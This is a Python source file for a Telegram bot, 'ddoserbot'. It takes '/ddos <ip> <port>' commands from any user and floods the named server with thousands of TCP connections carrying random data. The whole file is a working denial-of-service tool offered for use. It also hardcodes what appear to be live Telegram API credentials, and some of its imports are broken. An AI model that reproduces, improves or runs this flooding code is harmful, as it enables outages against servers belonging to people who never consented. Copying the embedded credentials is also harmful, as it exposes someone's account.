from pyrogram import Client
from pyrogram.types import *
import subprocess
import socket , random
import types , enums , idle
api_id = 11556589
api_hash = '551b36edf3dabde0eb4d5085269353a0'
bot = Client("ddoserbot", api_id, api_hash)

async def ddos(message ,ip , port):
    await bot.send_message(message.chat.id, "✈︎ loding..!")
    for i in range(10000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            t = (str(ip), int(port))
            byte = random._urandom(1024)
            s.connect(t)
            for _ in range(60000):
                s.send(byte)
        except:
            pass
    await bot.send_message(message.chat.id, f"☕︎ 10000 Packet sennd to server : {ip}  ")
    

@bot.on_message()
async def test(client , message):
    p_m = message.text
    if p_m =='/start':
        await bot.send_message(message.chat.id , f"Hello {str(message.chat.first_name)} welcom to my ddoser bot\n❈ How to use bot : `/ddos` (ip) (port)\n❈ `/ddos 1.1.1.1 80`\n☯︎ Creator : @ReaLAraz")
    elif p_m.split(' ')[0] == '/ddos':
        ip = p_m.split(' ')[1]
        port = p_m.split(' ')[2]
        await ddos(message,ip=ip, port=port)
    elif p_m == 'creator':
        await bot.send_message(message.chat.id , f"Creator : @RealAraz")
    else:
        await bot.send_message(message.chat.id, f"⚠︎ Error..!")
bot.start(), print("bot is online"),idle(), bot.stop()
